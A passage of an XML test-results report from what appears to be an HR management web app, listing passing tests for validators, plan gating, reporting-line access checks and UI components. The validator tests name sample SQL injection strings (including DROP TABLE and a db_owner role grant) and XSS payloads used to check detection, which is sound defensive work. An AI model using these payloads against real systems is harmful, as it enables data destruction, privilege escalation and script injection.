    <testcase classname="validateEmail - edge cases rejects edge case: too-long-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@example.com" name="validateEmail - edge cases rejects edge case: too-long-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@example.com" time="0">
    </testcase>
    <testcase classname="validateEmail - edge cases rejects edge case: " name="validateEmail - edge cases rejects edge case: " time="0.001">
    </testcase>
    <testcase classname="validatePhone - edge cases rejects edge case: 123456789" name="validatePhone - edge cases rejects edge case: 123456789" time="0">
    </testcase>
    <testcase classname="validatePhone - edge cases rejects edge case: 1234567890123456" name="validatePhone - edge cases rejects edge case: 1234567890123456" time="0.001">
    </testcase>
    <testcase classname="validatePhone - edge cases rejects edge case: not-a-phone" name="validatePhone - edge cases rejects edge case: not-a-phone" time="0">
    </testcase>
    <testcase classname="validatePhone - edge cases rejects edge case: " name="validatePhone - edge cases rejects edge case: " time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: &apos; OR 1=1--" name="containsSQLInjection - edge cases detects SQL injection edge case: &apos; OR 1=1--" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: admin&apos; OR &apos;1&apos;=&apos;1" name="containsSQLInjection - edge cases detects SQL injection edge case: admin&apos; OR &apos;1&apos;=&apos;1" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: 1; DROP TABLE users" name="containsSQLInjection - edge cases detects SQL injection edge case: 1; DROP TABLE users" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: &apos; UNION SELECT null--" name="containsSQLInjection - edge cases detects SQL injection edge case: &apos; UNION SELECT null--" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: SELECT * FROM users WHERE id = 1 OR 1=1" name="containsSQLInjection - edge cases detects SQL injection edge case: SELECT * FROM users WHERE id = 1 OR 1=1" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: &apos;; EXEC sp_addrolemember &apos;db_owner&apos;, &apos;evil&apos;" name="containsSQLInjection - edge cases detects SQL injection edge case: &apos;; EXEC sp_addrolemember &apos;db_owner&apos;, &apos;evil&apos;" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: select password" name="containsSQLInjection - edge cases detects SQL injection edge case: select password" time="0.001">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: drop users" name="containsSQLInjection - edge cases detects SQL injection edge case: drop users" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases detects SQL injection edge case: delete from logs where id = 1" name="containsSQLInjection - edge cases detects SQL injection edge case: delete from logs where id = 1" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases allows safe SQL edge case: order status" name="containsSQLInjection - edge cases allows safe SQL edge case: order status" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases allows safe SQL edge case: table of contents" name="containsSQLInjection - edge cases allows safe SQL edge case: table of contents" time="0">
    </testcase>
    <testcase classname="containsSQLInjection - edge cases allows safe SQL edge case: hello world" name="containsSQLInjection - edge cases allows safe SQL edge case: hello world" time="0">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: &lt;script&gt;evil()&lt;/script&gt;" name="containsXSS - edge cases detects XSS edge case: &lt;script&gt;evil()&lt;/script&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: &lt;iframe src=&quot;xss.html&quot;&gt;&lt;/iframe&gt;" name="containsXSS - edge cases detects XSS edge case: &lt;iframe src=&quot;xss.html&quot;&gt;&lt;/iframe&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: javascript:doEvil()" name="containsXSS - edge cases detects XSS edge case: javascript:doEvil()" time="0">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: &lt;img onerror=&quot;x()&quot;&gt;" name="containsXSS - edge cases detects XSS edge case: &lt;img onerror=&quot;x()&quot;&gt;" time="0.001">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: eval(&quot;evil&quot;)" name="containsXSS - edge cases detects XSS edge case: eval(&quot;evil&quot;)" time="0">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: &lt;embed src=&quot;evil.swf&quot;&gt;" name="containsXSS - edge cases detects XSS edge case: &lt;embed src=&quot;evil.swf&quot;&gt;" time="0.002">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: &lt;object data=&quot;evil&quot;&gt;" name="containsXSS - edge cases detects XSS edge case: &lt;object data=&quot;evil&quot;&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - edge cases detects XSS edge case: &lt;svg onload=&quot;x()&quot;&gt;" name="containsXSS - edge cases detects XSS edge case: &lt;svg onload=&quot;x()&quot;&gt;" time="0">
    </testcase>
    <testcase classname="containsXSS - edge cases allows safe HTML: &lt;p&gt;normal&lt;/p&gt;" name="containsXSS - edge cases allows safe HTML: &lt;p&gt;normal&lt;/p&gt;" time="0.002">
    </testcase>
    <testcase classname="containsXSS - edge cases allows safe HTML: &lt;b&gt;bold&lt;/b&gt;" name="containsXSS - edge cases allows safe HTML: &lt;b&gt;bold&lt;/b&gt;" time="0.001">
    </testcase>
    <testcase classname="containsXSS - edge cases allows safe HTML: &lt;i&gt;italic&lt;/i&gt;" name="containsXSS - edge cases allows safe HTML: &lt;i&gt;italic&lt;/i&gt;" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - edge cases checks sensitive edge: 4111111111111111 -&gt; true" name="containsSensitiveData - edge cases checks sensitive edge: 4111111111111111 -&gt; true" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData - edge cases checks sensitive edge: 123-45-6789 -&gt; true" name="containsSensitiveData - edge cases checks sensitive edge: 123-45-6789 -&gt; true" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData - edge cases checks sensitive edge: user@test.com -&gt; true" name="containsSensitiveData - edge cases checks sensitive edge: user@test.com -&gt; true" time="0.001">
    </testcase>
    <testcase classname="containsSensitiveData - edge cases checks sensitive edge: 555-123-4567 -&gt; true" name="containsSensitiveData - edge cases checks sensitive edge: 555-123-4567 -&gt; true" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - edge cases checks sensitive edge:  -&gt; false" name="containsSensitiveData - edge cases checks sensitive edge:  -&gt; false" time="0">
    </testcase>
    <testcase classname="containsSensitiveData - edge cases checks sensitive edge:     -&gt; false" name="containsSensitiveData - edge cases checks sensitive edge:     -&gt; false" time="0.001">
    </testcase>
    <testcase classname="sanitizeObject - edge cases handles deeply nested objects" name="sanitizeObject - edge cases handles deeply nested objects" time="0.001">
    </testcase>
    <testcase classname="sanitizeObject - edge cases handles empty object" name="sanitizeObject - edge cases handles empty object" time="0">
    </testcase>
    <testcase classname="sanitizeObject - edge cases handles arrays of non-strings" name="sanitizeObject - edge cases handles arrays of non-strings" time="0">
    </testcase>
    <testcase classname="validateFile - edge cases rejects empty filename" name="validateFile - edge cases rejects empty filename" time="0.001">
    </testcase>
    <testcase classname="validateFile - edge cases rejects document with image extension" name="validateFile - edge cases rejects document with image extension" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="PLAN_FEATURES.starter" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:48" time="3.933" tests="16">
    <testcase classname="PLAN_FEATURES.starter has strategyMaps: false (Starter does NOT get strategy maps)" name="PLAN_FEATURES.starter has strategyMaps: false (Starter does NOT get strategy maps)" time="0.003">
    </testcase>
    <testcase classname="PLAN_FEATURES.starter has analytics: true" name="PLAN_FEATURES.starter has analytics: true" time="0.001">
    </testcase>
    <testcase classname="PLAN_FEATURES.starter has a finite maxEmployees" name="PLAN_FEATURES.starter has a finite maxEmployees" time="0.001">
    </testcase>
    <testcase classname="PLAN_FEATURES.professional has strategyMaps: true (Professional gets strategy maps)" name="PLAN_FEATURES.professional has strategyMaps: true (Professional gets strategy maps)" time="0">
    </testcase>
    <testcase classname="PLAN_FEATURES.professional has advancedAnalytics: true" name="PLAN_FEATURES.professional has advancedAnalytics: true" time="0.001">
    </testcase>
    <testcase classname="PLAN_FEATURES.enterprise has strategyMaps: true (Enterprise gets strategy maps)" name="PLAN_FEATURES.enterprise has strategyMaps: true (Enterprise gets strategy maps)" time="0">
    </testcase>
    <testcase classname="PLAN_FEATURES.enterprise has unlimited maxEmployees" name="PLAN_FEATURES.enterprise has unlimited maxEmployees" time="0">
    </testcase>
    <testcase classname="strategyMaps gating is false on starter — upgrade needed" name="strategyMaps gating is false on starter — upgrade needed" time="0.001">
    </testcase>
    <testcase classname="strategyMaps gating is true on professional" name="strategyMaps gating is true on professional" time="0">
    </testcase>
    <testcase classname="strategyMaps gating is true on enterprise" name="strategyMaps gating is true on enterprise" time="0">
    </testcase>
    <testcase classname="strategyMaps gating requires professional plan at minimum" name="strategyMaps gating requires professional plan at minimum" time="0.001">
    </testcase>
    <testcase classname="PLAN_LABELS has labels for all plan types" name="PLAN_LABELS has labels for all plan types" time="0.001">
    </testcase>
    <testcase classname="PLAN_PRICES has prices for all plan types" name="PLAN_PRICES has prices for all plan types" time="0.002">
    </testcase>
    <testcase classname="planIncludes returns true when current plan is the same as required" name="planIncludes returns true when current plan is the same as required" time="0">
    </testcase>
    <testcase classname="planIncludes returns true when current plan is higher tier" name="planIncludes returns true when current plan is higher tier" time="0">
    </testcase>
    <testcase classname="planIncludes returns false when current plan is lower tier" name="planIncludes returns false when current plan is lower tier" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="ProjectsClient" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:50" time="2.328" tests="14">
    <testcase classname="ProjectsClient renders the projects page title" name="ProjectsClient renders the projects page title" time="0.065">
    </testcase>
    <testcase classname="ProjectsClient renders stats cards with correct labels" name="ProjectsClient renders stats cards with correct labels" time="0.045">
    </testcase>
    <testcase classname="ProjectsClient renders project cards" name="ProjectsClient renders project cards" time="0.048">
    </testcase>
    <testcase classname="ProjectsClient shows create button for admin users" name="ProjectsClient shows create button for admin users" time="0.079">
    </testcase>
    <testcase classname="ProjectsClient shows progress bar for projects" name="ProjectsClient shows progress bar for projects" time="0.037">
    </testcase>
    <testcase classname="ProjectsClient filters projects by search query" name="ProjectsClient filters projects by search query" time="0.073">
    </testcase>
    <testcase classname="ProjectsClient shows empty state when no projects match" name="ProjectsClient shows empty state when no projects match" time="0.025">
    </testcase>
    <testcase classname="ProjectsClient renders loading state when projects not loaded" name="ProjectsClient renders loading state when projects not loaded" time="0.022">
    </testcase>
    <testcase classname="ProjectsClient shows overall progress card with percentage" name="ProjectsClient shows overall progress card with percentage" time="0.032">
    </testcase>
    <testcase classname="ProjectsClient allows admin to open create dialog" name="ProjectsClient allows admin to open create dialog" time="0.093">
    </testcase>
    <testcase classname="ProjectsClient shows filter by status options" name="ProjectsClient shows filter by status options" time="0.04">
    </testcase>
    <testcase classname="ProjectsClient navigates to project on card click" name="ProjectsClient navigates to project on card click" time="0.047">
    </testcase>
    <testcase classname="ProjectsClient renders for employee role without create button" name="ProjectsClient renders for employee role without create button" time="0.04">
    </testcase>
    <testcase classname="ProjectsClient shows create first project button when empty for admin" name="ProjectsClient shows create first project button when empty for admin" time="0.038">
    </testcase>
  </testsuite>
  <testsuite name="reporting.getReportingLine" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:49" time="3.36" tests="31">
    <testcase classname="reporting.getReportingLine returns null for unauthenticated caller" name="reporting.getReportingLine returns null for unauthenticated caller" time="0.004">
    </testcase>
    <testcase classname="reporting.getReportingLine returns null when target user not found" name="reporting.getReportingLine returns null when target user not found" time="0.001">
    </testcase>
    <testcase classname="reporting.getReportingLine returns null for cross-org caller (not superadmin)" name="reporting.getReportingLine returns null for cross-org caller (not superadmin)" time="0.001">
    </testcase>
    <testcase classname="reporting.getReportingLine returns reporting line for same-org caller" name="reporting.getReportingLine returns reporting line for same-org caller" time="0.003">
    </testcase>
    <testcase classname="reporting.getReportingLine returns reporting line for superadmin from any org" name="reporting.getReportingLine returns reporting line for superadmin from any org" time="0.001">
    </testcase>
    <testcase classname="reporting.getReportingLine stops chain walk when supervisor is inactive" name="reporting.getReportingLine stops chain walk when supervisor is inactive" time="0.001">
    </testcase>
    <testcase classname="reporting.getReportingLine stops chain walk at max 10 hops (cycle safety)" name="reporting.getReportingLine stops chain walk at max 10 hops (cycle safety)" time="0.001">
    </testcase>
    <testcase classname="reporting.getPotentialManagers returns empty for unauthenticated caller" name="reporting.getPotentialManagers returns empty for unauthenticated caller" time="0.001">
    </testcase>
    <testcase classname="reporting.getPotentialManagers returns empty for cross-org caller" name="reporting.getPotentialManagers returns empty for cross-org caller" time="0.001">
    </testcase>
    <testcase classname="reporting.getPotentialManagers returns candidates for same-org admin" name="reporting.getPotentialManagers returns candidates for same-org admin" time="0.004">
    </testcase>
    <testcase classname="reporting.getPotentialManagers excludes superadmin users from candidates" name="reporting.getPotentialManagers excludes superadmin users from candidates" time="0.001">
    </testcase>
    <testcase classname="reporting.getPotentialManagers excludes self via excludeUserId" name="reporting.getPotentialManagers excludes self via excludeUserId" time="0.001">
    </testcase>
    <testcase classname="reporting.getPotentialManagers filters by search query" name="reporting.getPotentialManagers filters by search query" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager rejects unauthenticated caller" name="reporting.assignManager rejects unauthenticated caller" time="0.069">
    </testcase>
    <testcase classname="reporting.assignManager rejects employee caller" name="reporting.assignManager rejects employee caller" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager rejects cross-org admin" name="reporting.assignManager rejects cross-org admin" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager throws when employee not found" name="reporting.assignManager throws when employee not found" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager rejects self-assignment" name="reporting.assignManager rejects self-assignment" time="0.002">
    </testcase>
    <testcase classname="reporting.assignManager allows same-org admin to assign manager" name="reporting.assignManager allows same-org admin to assign manager" time="0.003">
    </testcase>
    <testcase classname="reporting.assignManager allows supervisor role to assign manager" name="reporting.assignManager allows supervisor role to assign manager" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager allows superadmin from any org" name="reporting.assignManager allows superadmin from any org" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager throws when supervisor not found" name="reporting.assignManager throws when supervisor not found" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager throws when supervisor is inactive" name="reporting.assignManager throws when supervisor is inactive" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager throws on cross-org supervisor" name="reporting.assignManager throws on cross-org supervisor" time="0.002">
    </testcase>
    <testcase classname="reporting.assignManager detects circular reporting lines" name="reporting.assignManager detects circular reporting lines" time="0.001">
    </testcase>
    <testcase classname="reporting.assignManager removes manager when supervisorId is omitted" name="reporting.assignManager removes manager when supervisorId is omitted" time="0.003">
    </testcase>
    <testcase classname="reporting.assignManager logs audit with correct action and details" name="reporting.assignManager logs audit with correct action and details" time="0.003">
    </testcase>
    <testcase classname="reporting.getOrgHierarchyTree returns empty for unauthenticated caller" name="reporting.getOrgHierarchyTree returns empty for unauthenticated caller" time="0.004">
    </testcase>
    <testcase classname="reporting.getOrgHierarchyTree returns empty for cross-org caller" name="reporting.getOrgHierarchyTree returns empty for cross-org caller" time="0.001">
    </testcase>
    <testcase classname="reporting.getOrgHierarchyTree returns tree for same-org admin" name="reporting.getOrgHierarchyTree returns tree for same-org admin" time="0.001">
    </testcase>
    <testcase classname="reporting.getOrgHierarchyTree allows superadmin to see any org tree" name="reporting.getOrgHierarchyTree allows superadmin to see any org tree" time="0.001">
    </testcase>
  </testsuite>
  <testsuite name="EmployeeProfileHero" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:51" time="2.422" tests="37">
    <testcase classname="EmployeeProfileHero renders employee name" name="EmployeeProfileHero renders employee name" time="0.045">
    </testcase>
    <testcase classname="EmployeeProfileHero renders employee position" name="EmployeeProfileHero renders employee position" time="0.022">
    </testcase>
    <testcase classname="EmployeeProfileHero renders employee position fallback to role when position is missing" name="EmployeeProfileHero renders employee position fallback to role when position is missing" time="0.019">
    </testcase>
    <testcase classname="EmployeeProfileHero renders initials when no avatar" name="EmployeeProfileHero renders initials when no avatar" time="0.018">
    </testcase>
    <testcase classname="EmployeeProfileHero renders initials from single name" name="EmployeeProfileHero renders initials from single name" time="0.017">
    </testcase>
    <testcase classname="EmployeeProfileHero renders avatar image when avatarUrl is provided" name="EmployeeProfileHero renders avatar image when avatarUrl is provided" time="0.029">
    </testcase>
    <testcase classname="EmployeeProfileHero renders badges for role, employee type, and status" name="EmployeeProfileHero renders badges for role, employee type, and status" time="0.024">
    </testcase>
    <testcase classname="EmployeeProfileHero shows active status when isActive is true" name="EmployeeProfileHero shows active status when isActive is true" time="0.023">
    </testcase>
    <testcase classname="EmployeeProfileHero shows inactive status when isActive is false" name="EmployeeProfileHero shows inactive status when isActive is false" time="0.025">
    </testcase>
    <testcase classname="EmployeeProfileHero renders edit button when canEdit is true" name="EmployeeProfileHero renders edit button when canEdit is true" time="0.029">
    </testcase>
    <testcase classname="EmployeeProfileHero does not render edit button when canEdit is false" name="EmployeeProfileHero does not render edit button when canEdit is false" time="0.015">
    </testcase>
    <testcase classname="EmployeeProfileHero renders delete button when canDelete is true" name="EmployeeProfileHero renders delete button when canDelete is true" time="0.016">
    </testcase>
    <testcase classname="EmployeeProfileHero does not render delete button when canDelete is false" name="EmployeeProfileHero does not render delete button when canDelete is false" time="0.015">
    </testcase>
    <testcase classname="EmployeeProfileHero renders rate button for admin/supervisor" name="EmployeeProfileHero renders rate button for admin/supervisor" time="0.016">
    </testcase>
    <testcase classname="EmployeeProfileHero shows cancel text on rate button when showRatingForm is true" name="EmployeeProfileHero shows cancel text on rate button when showRatingForm is true" time="0.016">
    </testcase>
    <testcase classname="EmployeeProfileHero does not render rate button when not admin/supervisor" name="EmployeeProfileHero does not render rate button when not admin/supervisor" time="0.014">
    </testcase>
    <testcase classname="EmployeeProfileHero calls onEdit when edit button clicked" name="EmployeeProfileHero calls onEdit when edit button clicked" time="0.017">
    </testcase>
    <testcase classname="EmployeeProfileHero calls onDelete when delete button clicked" name="EmployeeProfileHero calls onDelete when delete button clicked" time="0.017">
    </testcase>
    <testcase classname="EmployeeProfileHero calls onRate when rate button clicked" name="EmployeeProfileHero calls onRate when rate button clicked" time="0.028">
    </testcase>
    <testcase classname="EmployeeProfileHero renders AI score circular stat when score is provided" name="EmployeeProfileHero renders AI score circular stat when score is provided" time="0.023">
    </testcase>
    <testcase classname="EmployeeProfileHero renders attendance percentage from score breakdown" name="EmployeeProfileHero renders attendance percentage from score breakdown" time="0.021">
    </testcase>
    <testcase classname="EmployeeProfileHero renders punctuality stat when monthlyStats is provided" name="EmployeeProfileHero renders punctuality stat when monthlyStats is provided" time="0.023">
    </testcase>
    <testcase classname="EmployeeProfileHero renders hours worked stat when monthlyStats is provided" name="EmployeeProfileHero renders hours worked stat when monthlyStats is provided" time="0.022">
    </testcase>
    <testcase classname="EmployeeProfileHero renders both score and monthlyStats when both provided" name="EmployeeProfileHero renders both score and monthlyStats when both provided" time="0.031">
    </testcase>
    <testcase classname="EmployeeProfileHero does not render score stats when score is null" name="EmployeeProfileHero does not render score stats when score is null" time="0.014">
    </testcase>
    <testcase classname="EmployeeProfileHero does not render monthly stats when monthlyStats is null" name="EmployeeProfileHero does not render monthly stats when monthlyStats is null" time="0.015">
    </testcase>
    <testcase classname="EmployeeProfileHero renders email with mailto link" name="EmployeeProfileHero renders email with mailto link" time="0.016">
    </testcase>
    <testcase classname="EmployeeProfileHero renders phone with tel link" name="EmployeeProfileHero renders phone with tel link" time="0.015">
    </testcase>
    <testcase classname="EmployeeProfileHero does not render phone when phone is not provided" name="EmployeeProfileHero does not render phone when phone is not provided" time="0.013">
    </testcase>
    <testcase classname="EmployeeProfileHero renders department" name="EmployeeProfileHero renders department" time="0.023">
    </testcase>
    <testcase classname="EmployeeProfileHero renders location when provided" name="EmployeeProfileHero renders location when provided" time="0.016">
    </testcase>
    <testcase classname="EmployeeProfileHero does not render location when not provided" name="EmployeeProfileHero does not render location when not provided" time="0.015">
    </testcase>
    <testcase classname="EmployeeProfileHero renders formatted created date" name="EmployeeProfileHero renders formatted created date" time="0.015">
    </testcase>
    <testcase classname="EmployeeProfileHero CircularStat component handles zero value rendering" name="EmployeeProfileHero CircularStat component handles zero value rendering" time="0.027">
    </testcase>
    <testcase classname="EmployeeProfileHero CircularStat component handles large score values" name="EmployeeProfileHero CircularStat component handles large score values" time="0.017">
    </testcase>
    <testcase classname="EmployeeProfileHero Employee with minimal data renders with minimal employee fields only" name="EmployeeProfileHero Employee with minimal data renders with minimal employee fields only" time="0.013">
    </testcase>
    <testcase classname="EmployeeProfileHero All action buttons renders all three action buttons when all permissions granted" name="EmployeeProfileHero All action buttons renders all three action buttons when all permissions granted" time="0.02">
    </testcase>
  </testsuite>
  <testsuite name="DashboardClient" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:52" time="1.931" tests="20">
    <testcase classname="DashboardClient renders dashboard content after mount (React 19 flushes useEffect in act())" name="DashboardClient renders dashboard content after mount (React 19 flushes useEffect in act())" time="0.029">
    </testcase>
    <testcase classname="DashboardClient renders dashboard after mount with loading state" name="DashboardClient renders dashboard after mount with loading state" time="0.024">
    </testcase>
    <testcase classname="DashboardClient renders stat cards with loading placeholders" name="DashboardClient renders stat cards with loading placeholders" time="0.029">
    </testcase>
    <testcase classname="DashboardClient renders real stats when data loads" name="DashboardClient renders real stats when data loads" time="0.029">
    </testcase>
    <testcase classname="DashboardClient shows error state when dashboardStats returns null" name="DashboardClient shows error state when dashboardStats returns null" time="0.008">
    </testcase>
    <testcase classname="DashboardClient shows security widget for superadmin" name="DashboardClient shows security widget for superadmin" time="0.025">
    </testcase>
    <testcase classname="DashboardClient does not show security widget for non-superadmin" name="DashboardClient does not show security widget for non-superadmin" time="0.023">
    </testcase>
    <testcase classname="DashboardClient renders leave charts" name="DashboardClient renders leave charts" time="0.02">
    </testcase>
    <testcase classname="DashboardClient renders recent leaves card and leave stats" name="DashboardClient renders recent leaves card and leave stats" time="0.022">
    </testcase>
    <testcase classname="DashboardClient renders strategy widget" name="DashboardClient renders strategy widget" time="0.026">
    </testcase>
    <testcase classname="DashboardClient renders quick actions" name="DashboardClient renders quick actions" time="0.027">
    </testcase>
    <testcase classname="DashboardClient renders enterprise widgets for enterprise plan" name="DashboardClient renders enterprise widgets for enterprise plan" time="0.024">
    </testcase>
    <testcase classname="DashboardClient does not render enterprise widgets for non-enterprise plan" name="DashboardClient does not render enterprise widgets for non-enterprise plan" time="0.027">
    </testcase>
    <testcase classname="DashboardClient handles zero values in stats gracefully" name="DashboardClient handles zero values in stats gracefully" time="0.024">
    </testcase>
    <testcase classname="DashboardClient renders without crashing when user has no id" name="DashboardClient renders without crashing when user has no id" time="0.019">
    </testcase>
    <testcase classname="DashboardClient handles missing recentLeaves data" name="DashboardClient handles missing recentLeaves data" time="0.021">
    </testcase>
    <testcase classname="DashboardClient renders with full pieData and monthlyTrend" name="DashboardClient renders with full pieData and monthlyTrend" time="0.021">
    </testcase>
    <testcase classname="DashboardClient renders without userId (not authenticated)" name="DashboardClient renders without userId (not authenticated)" time="0.02">
    </testcase>
    <testcase classname="DashboardClient renders with superadmin role and security stats" name="DashboardClient renders with superadmin role and security stats" time="0.02">
    </testcase>
    <testcase classname="DashboardClient renders with empty organizations list" name="DashboardClient renders with empty organizations list" time="0.02">
    </testcase>
  </testsuite>
  <testsuite name="NewIntegrationSettings" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:51" time="2.329" tests="17">
    <testcase classname="NewIntegrationSettings renders the integrations page title" name="NewIntegrationSettings renders the integrations page title" time="0.177">
    </testcase>
    <testcase classname="NewIntegrationSettings renders all three provider cards" name="NewIntegrationSettings renders all three provider cards" time="0.023">
    </testcase>
    <testcase classname="NewIntegrationSettings shows Lucky Carrot as a provider" name="NewIntegrationSettings shows Lucky Carrot as a provider" time="0.025">
    </testcase>
    <testcase classname="NewIntegrationSettings shows imID as a provider" name="NewIntegrationSettings shows imID as a provider" time="0.025">
    </testcase>
    <testcase classname="NewIntegrationSettings shows Armsoft as a provider" name="NewIntegrationSettings shows Armsoft as a provider" time="0.037">
    </testcase>
    <testcase classname="NewIntegrationSettings shows active badge for enabled integrations" name="NewIntegrationSettings shows active badge for enabled integrations" time="0.021">
    </testcase>
    <testcase classname="NewIntegrationSettings shows inactive badge for disabled integrations" name="NewIntegrationSettings shows inactive badge for disabled integrations" time="0.02">
    </testcase>
    <testcase classname="NewIntegrationSettings shows loading indicator when no user" name="NewIntegrationSettings shows loading indicator when no user" time="0.006">
    </testcase>
    <testcase classname="NewIntegrationSettings shows loading indicator when no org" name="NewIntegrationSettings shows loading indicator when no org" time="0.019">
    </testcase>
    <testcase classname="NewIntegrationSettings renders without crashing with empty configs" name="NewIntegrationSettings renders without crashing with empty configs" time="0.022">
    </testcase>
    <testcase classname="NewIntegrationSettings shows active badges for enabled integrations" name="NewIntegrationSettings shows active badges for enabled integrations" time="0.02">
    </testcase>
    <testcase classname="NewIntegrationSettings shows inactive badge for disabled integration" name="NewIntegrationSettings shows inactive badge for disabled integration" time="0.02">
    </testcase>
    <testcase classname="NewIntegrationSettings expands provider card to show sync status" name="NewIntegrationSettings expands provider card to show sync status" time="0.075">
    </testcase>
    <testcase classname="NewIntegrationSettings shows configuration fields when expanded" name="NewIntegrationSettings shows configuration fields when expanded" time="0.064">
    </testcase>
    <testcase classname="NewIntegrationSettings expands armsoft to show cron field" name="NewIntegrationSettings expands armsoft to show cron field" time="0.049">
    </testcase>
    <testcase classname="NewIntegrationSettings shows provider descriptions" name="NewIntegrationSettings shows provider descriptions" time="0.017">
    </testcase>
    <testcase classname="NewIntegrationSettings renders the subtitle" name="NewIntegrationSettings renders the subtitle" time="0.013">
    </testcase>
  </testsuite>
  <testsuite name="StatsCard" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:52" time="2.221" tests="16">
    <testcase classname="StatsCard renders title and value" name="StatsCard renders title and value" time="0.122">
    </testcase>
    <testcase classname="StatsCard renders with all four dashboard colors" name="StatsCard renders with all four dashboard colors" time="0.111">
    </testcase>
    <testcase classname="StatsCard renders with string value" name="StatsCard renders with string value" time="0.009">
    </testcase>
    <testcase classname="StatsCard shows positive change with TrendingUp icon" name="StatsCard shows positive change with TrendingUp icon" time="0.02">
    </testcase>
    <testcase classname="StatsCard shows negative change with TrendingDown icon" name="StatsCard shows negative change with TrendingDown icon" time="0.016">
    </testcase>
    <testcase classname="StatsCard shows change label when provided" name="StatsCard shows change label when provided" time="0.015">
    </testcase>
    <testcase classname="StatsCard does not render change section when change is undefined" name="StatsCard does not render change section when change is undefined" time="0.012">
    </testcase>
    <testcase classname="StatsCard renders prefix before value" name="StatsCard renders prefix before value" time="0.017">
    </testcase>
    <testcase classname="StatsCard renders suffix after value" name="StatsCard renders suffix after value" time="0.013">
    </testcase>
    <testcase classname="StatsCard animates count from 0 to target value" name="StatsCard animates count from 0 to target value" time="0.011">
    </testcase>
    <testcase classname="StatsCard handles zero value in count-up" name="StatsCard handles zero value in count-up" time="0.008">
    </testcase>
    <testcase classname="StatsCard applies color-specific border class for blue" name="StatsCard applies color-specific border class for blue" time="0.011">
    </testcase>
    <testcase classname="StatsCard applies color-specific border class for green" name="StatsCard applies color-specific border class for green" time="0.007">
    </testcase>
    <testcase classname="StatsCard renders icon inside card" name="StatsCard renders icon inside card" time="0.009">
    </testcase>
    <testcase classname="StatsCard applies different animation delay based on index" name="StatsCard applies different animation delay based on index" time="0.014">
    </testcase>
    <testcase classname="StatsCard passes correct props to memo" name="StatsCard passes correct props to memo" time="0.023">
    </testcase>
  </testsuite>
  <testsuite name="LeaveBalancesPage" errors="0" failures="0" skipped="0" timestamp="2026-07-28T12:22:52" time="2.14" tests="18">
    <testcase classname="LeaveBalancesPage renders the page title" name="LeaveBalancesPage renders the page title" time="0.046">
    </testcase>
    <testcase classname="LeaveBalancesPage renders the subtitle" name="LeaveBalancesPage renders the subtitle" time="0.035">
    </testcase>
    <testcase classname="LeaveBalancesPage shows employee cards" name="LeaveBalancesPage shows employee cards" time="0.035">
    </testcase>
    <testcase classname="LeaveBalancesPage shows ShieldLoader when no user" name="LeaveBalancesPage shows ShieldLoader when no user" time="0.005">
    </testcase>
    <testcase classname="LeaveBalancesPage shows employee department info" name="LeaveBalancesPage shows employee department info" time="0.022">
    </testcase>
    <testcase classname="LeaveBalancesPage shows email when no department/position" name="LeaveBalancesPage shows email when no department/position" time="0.023">
    </testcase>
    <testcase classname="LeaveBalancesPage shows employee type badge" name="LeaveBalancesPage shows employee type badge" time="0.026">
    </testcase>
